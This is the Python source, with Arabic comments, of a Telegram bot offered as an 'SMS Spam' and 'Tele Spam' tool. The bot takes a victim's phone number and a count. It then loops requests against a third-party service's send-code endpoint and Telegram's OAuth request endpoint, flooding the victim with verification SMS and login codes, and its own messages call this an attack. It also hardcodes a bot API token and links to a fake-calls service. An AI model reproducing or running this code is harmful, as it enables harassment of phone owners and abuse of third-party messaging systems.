import telebot
from telebot import types
import requests
import time
import threading
import random
import string
import json
import os
from datetime import datetime

# ==========================================
# 1. إعدادات النظام
# ==========================================
API_TOKEN = '8408417562:AAGbJ1VuFQ7nzTQhrTl72Atv5tkBmyFJWlU'
ADMIN_ID = 1431886140  # الآيدي الخاص بك

bot = telebot.TeleBot(API_TOKEN)
active_processes = {}  # لتخزين حالة العمليات (تشغيل/إيقاف)

# ==========================================
# 2. إدارة البيانات (Database)
# ==========================================
DB_FILE = "users_db.json"

def load_db():
    if not os.path.exists(DB_FILE): return {}
    try:
        with open(DB_FILE, 'r', encoding='utf-8') as f: return json.load(f)
    except: return {}

def save_db(data):
    with open(DB_FILE, 'w', encoding='utf-8') as f: json.dump(data, f, ensure_ascii=False, indent=4)

def check_user(user):
    db = load_db()
    uid = str(user.id)
    if uid not in db:
        db[uid] = {"name": user.first_name, "banned": False}
        save_db(db)
        try:
            if int(uid) != ADMIN_ID:
                bot.send_message(ADMIN_ID, f"🔔 <b>عضو جديد:</b> {user.first_name} (`{uid}`)", parse_mode="HTML")
        except: pass
    return db[uid]["banned"]

def toggle_ban(uid, status):
    db = load_db()
    if str(uid) in db:
        db[str(uid)]["banned"] = status
        save_db(db)
        return True
    return False

# ==========================================
# 3. واجهة البوت والتشغيل
# ==========================================
BANNER = """
 █████╗ ██████╗  ██████╗ 
██╔══██╗██╔══██╗██╔═══██╗
███████║██████╔╝██║   ██║
██╔══██║██╔══██╗██║   ██║
██║  ██║██████╔╝╚██████╔╝
╚═╝  ╚═╝╚═════╝  ╚═════╝ 
★ ABO-ELFADL SECURITY SYSTEM ★
"""

@bot.message_handler(commands=['start'])
def start_msg(message):
    user_id = message.from_user.id
    print(f"--> تسجيل دخول من ID: {user_id}")
    
    if check_user(message.from_user):
        bot.reply_to(message, "⛔ <b>أنت محظور من استخدام هذا البوت.</b>", parse_mode="HTML")
        return

    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    
    # 1. أزرار WebApps
    btn_web = types.KeyboardButton(text="موقع المطور", web_app=types.WebAppInfo(url="https://mahmoud-ab0-elfadl.netlify.app/"))
    btn_fake = types.KeyboardButton(text="FAKE CALLS", web_app=types.WebAppInfo(url="https://callmyphone.org/app"))
    
    # 2. أزرار الأدوات
    btn_sms = types.KeyboardButton("🔥 SMS Spam")
    btn_tele = types.KeyboardButton("✈️ Tele Spam")
    btn_info = types.KeyboardButton("ℹ️ المطور")
    
    markup.add(btn_sms, btn_tele, btn_fake, btn_web, btn_info)

    if user_id == ADMIN_ID:
        btn_admin = types.KeyboardButton("⚙️ التحكم في الأعضاء (Admin)")
        markup.add(btn_admin)

    bot.reply_to(message, f"{BANNER}\n👋 أهلاً بك يا <b>{message.from_user.first_name}</b>.", parse_mode="HTML", reply_markup=markup)

# ==========================================
# 4. معالجة الأزرار (Flow Handlers)
# ==========================================

# --- SMS Handlers ---
@bot.message_handler(func=lambda message: message.text == "🔥 SMS Spam")
def handle_sms(message):
    if check_user(message.from_user): return
    msg = bot.reply_to(message, "📲 <b>أدخل الرقم المصري المراد إرسال الرسائل له:</b>", parse_mode="HTML")
    bot.register_next_step_handler(msg, get_sms_phone)

def get_sms_phone(message):
    phone = message.text
    if not phone.isdigit():
        bot.reply_to(message, "❌ رقم غير صحيح.")
        return
    if phone.startswith("01"): phone = "2" + phone
    
    msg = bot.reply_to(message, "🔢 <b>كم عدد الرسائل التي تريد إرسالها؟</b>\n(أرسل الرقم فقط، مثال: 50)", parse_mode="HTML")
    bot.register_next_step_handler(msg, lambda m: start_spam_sms(m, phone))

# --- Telegram Handlers ---
@bot.message_handler(func=lambda message: message.text == "✈️ Tele Spam")
def handle_tele(message):
    if check_user(message.from_user): return
    msg = bot.reply_to(message, "✈️ <b>أدخل الرقم الدولي (مثال: 964xxxx):</b>", parse_mode="HTML")
    bot.register_next_step_handler(msg, get_tele_phone)

def get_tele_phone(message):
    phone = message.text
    if not phone.isdigit():
        bot.reply_to(message, "❌ رقم غير صحيح.")
        return
    
    msg = bot.reply_to(message, "🔢 <b>كم عدد المحاولات (Spam Requests)؟</b>\n(أرسل الرقم فقط، مثال: 30)", parse_mode="HTML")
    bot.register_next_step_handler(msg, lambda m: start_spam_tele(m, phone))

# --- Info Handler ---
@bot.message_handler(func=lambda message: message.text == "ℹ️ المطور")
def handle_info(message):
    info = """
👨‍💻 <b>محمود أبو الفضل</b>
طالب بقسم التاريخ - جامعة حلوان.
صاحب رؤية AboElfadl Media & Store.
    """
    bot.reply_to(message, info, parse_mode="HTML")

# --- Admin Handler ---
@bot.message_handler(func=lambda message: message.text == "⚙️ التحكم في الأعضاء (Admin)")
def handle_admin(message):
    if message.from_user.id != ADMIN_ID: return
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("🚫 حظر عضو", callback_data='ban_user'),
        types.InlineKeyboardButton("✅ فك حظر", callback_data='unban_user'),
        types.InlineKeyboardButton("📜 عرض الأعضاء", callback_data='list_users')
    )
    bot.reply_to(message, "⚙️ <b>لوحة تحكم القائد:</b>", reply_markup=markup, parse_mode="HTML")

# ==========================================
# 5. منطق الأدوات (Execution Logic)
# ==========================================

# --- SMS Logic ---
def start_spam_sms(message, phone):
    if not message.text.isdigit():
        bot.reply_to(message, "❌ الرجاء إدخال رقم صحيح.")
        return
    
    count = int(message.text)
    chat_id = message.chat.id
    
    # إعداد زر التوقف
    markup = types.InlineKeyboardMarkup()
    stop_btn = types.InlineKeyboardButton("🛑 إيقاف الهجوم", callback_data='stop_sms_attack')
    markup.add(stop_btn)
    
    status_msg = bot.send_message(chat_id, f"🔥 <b>بدأ الهجوم على {phone}...</b>\nالعدد المطلوب: {count}\n⏳ جاري التحضير...", reply_markup=markup, parse_mode="HTML")
    
    active_processes[chat_id] = {'running': True, 'type': 'sms'}

    def run():
        url = "https://api.twistmena.com/music/Dlogin/sendCode"
        success = 0
        
        for i in range(count):
            if not active_processes.get(chat_id, {}).get('running', False):
                bot.send_message(chat_id, "🛑 <b>تم إيقاف هجوم SMS يدوياً.</b>", parse_mode="HTML")
                break
            
            rv = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
            try: 
                r = requests.post(url, json={"dial": phone, "randomValue": rv}, headers={"User-Agent": "Mozilla/5.0"}, timeout=3)
                if r.status_code == 200: success += 1
            except: pass
            
            # تحديث العداد
            if i % 1 == 0:
                try:
                    bot.edit_message_text(
                        f"🔥 <b>هجوم SMS نشط على {phone}</b>\n\n✅ <b>تم إرسال الرسالة رقم:</b> {success}\n🔄 المتبقي: {count - (i+1)}\n\nاضغط زر الإيقاف في الأسفل.",
                        chat_id,
                        status_msg.message_id,
                        reply_markup=markup,
                        parse_mode="HTML"
                    )
                except: pass
            
            time.sleep(1.5)
            
        if active_processes.get(chat_id, {}).get('running', False):
            bot.send_message(chat_id, f"✅ <b>تم الانتهاء!</b>\nأرسلنا {success} رسالة بنجاح.", parse_mode="HTML")
            try: bot.edit_message_reply_markup(chat_id, status_msg.message_id, reply_markup=None) # إخفاء الزر بعد الانتهاء
            except: pass
    
    threading.Thread(target=run).start()

# --- Telegram Logic ---
def start_spam_tele(message, phone):
    if not message.text.isdigit():
        bot.reply_to(message, "❌ الرجاء إدخال رقم صحيح.")
        return

    count = int(message.text)
    chat_id = message.chat.id

    markup = types.InlineKeyboardMarkup()
    stop_btn = types.InlineKeyboardButton("🛑 إيقاف الهجوم", callback_data='stop_tele_attack')
    markup.add(stop_btn)

    status_msg = bot.send_message(chat_id, f"✈️ <b>بدأ إزعاج تليجرام على {phone}...</b>\nالعدد المطلوب: {count}", reply_markup=markup, parse_mode="HTML")
    
    active_processes[chat_id] = {'running': True, 'type': 'tele'}

    def run():
        success = 0
        for i in range(count):
            if not active_processes.get(chat_id, {}).get('running', False):
                bot.send_message(chat_id, "🛑 <b>تم إيقاف هجوم تليجرام يدوياً.</b>", parse_mode="HTML")
                break

            try: 
                r = requests.post('https://oauth.tg.dev/auth/request?bot_id=1288099309&origin=https://t.me&lang=en', data={'phone': phone}, timeout=5)
                if r.text == "true": success += 1
            except: pass
            
            # تحديث العداد
            if i % 1 == 0:
                try:
                    bot.edit_message_text(
                        f"✈️ <b>هجوم Telegram نشط على {phone}</b>\n\n✅ <b>تم إرسال الطلب رقم:</b> {success}\n🔄 المتبقي: {count - (i+1)}\n\nاضغط زر الإيقاف في الأسفل.",
                        chat_id,
                        status_msg.message_id,
                        reply_markup=markup,
                        parse_mode="HTML"
                    )
                except: pass

            time.sleep(1.0) # تأخير لتجنب الحظر

        if active_processes.get(chat_id, {}).get('running', False):
            bot.send_message(chat_id, f"✅ <b>تم الانتهاء!</b>\nأرسلنا {success} كود تليجرام.", parse_mode="HTML")
            try: bot.edit_message_reply_markup(chat_id, status_msg.message_id, reply_markup=None)
            except: pass

    threading.Thread(target=run).start()

# ==========================================
# 6. معالجة الأزرار التفاعلية (Callbacks)
# ==========================================

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    chat_id = call.message.chat.id
    
    # --- إيقاف العمليات ---
    if call.data == 'stop_sms_attack':
        if chat_id in active_processes and active_processes[chat_id]['type'] == 'sms':
            active_processes[chat_id]['running'] = False
            bot.answer_callback_query(call.id, "جاري الإيقاف...")
            bot.edit_message_reply_markup(chat_id, call.message.message_id, reply_markup=None)
        else:
            bot.answer_callback_query(call.id, "العملية منتهية بالفعل.")

    elif call.data == 'stop_tele_attack':
        if chat_id in active_processes and active_processes[chat_id]['type'] == 'tele':
            active_processes[chat_id]['running'] = False
            bot.answer_callback_query(call.id, "جاري الإيقاف...")
            bot.edit_message_reply_markup(chat_id, call.message.message_id, reply_markup=None)
        else:
            bot.answer_callback_query(call.id, "العملية منتهية بالفعل.")

    # --- أدوات الأدمن ---
    if call.from_user.id != ADMIN_ID: return

    if call.data == 'ban_user':
        msg = bot.send_message(chat_id, "🚫 أرسل الـ ID المراد حظره:")
        bot.register_next_step_handler(msg, lambda m: do_ban(m, True))

    elif call.data == 'unban_user':
        msg = bot.send_message(chat_id, "✅ أرسل الـ ID لفك الحظر:")
        bot.register_next_step_handler(msg, lambda m: do_ban(m, False))

    elif call.data == 'list_users':
        db = load_db()
        txt = "📜 <b>قائمة الأعضاء المسجلين:</b>\n"
        for uid, d in db.items():
            s = "🔴 (محظور)" if d['banned'] else "🟢"
            txt += f"{s} `{uid}` | {d['name']}\n"
        
        if len(txt) > 4000:
             with open("users.txt", "w", encoding="utf-8") as f: f.write(txt)
             with open("users.txt", "rb") as f: bot.send_document(chat_id, f)
        else:
            bot.send_message(chat_id, txt, parse_mode="HTML")

def do_ban(message, status):
    target_id = message.text.strip()
    if toggle_ban(target_id, status):
        action = "حظر" if status else "فك حظر"
        bot.reply_to(message, f"✅ تم {action} العضو `{target_id}` بنجاح.", parse_mode="Markdown")
        try:
            msg_user = "⛔ تم حظرك من البوت." if status else "✅ تم فك الحظر عنك."
            bot.send_message(target_id, msg_user)
        except: pass
    else:
        bot.reply_to(message, "❌ المستخدم غير موجود في القاعدة أو لا يمكن حظره.")

# تشغيل
print(f"--- AboElfadl System V4 Online (Admin: {ADMIN_ID}) ---")
bot.infinity_polling()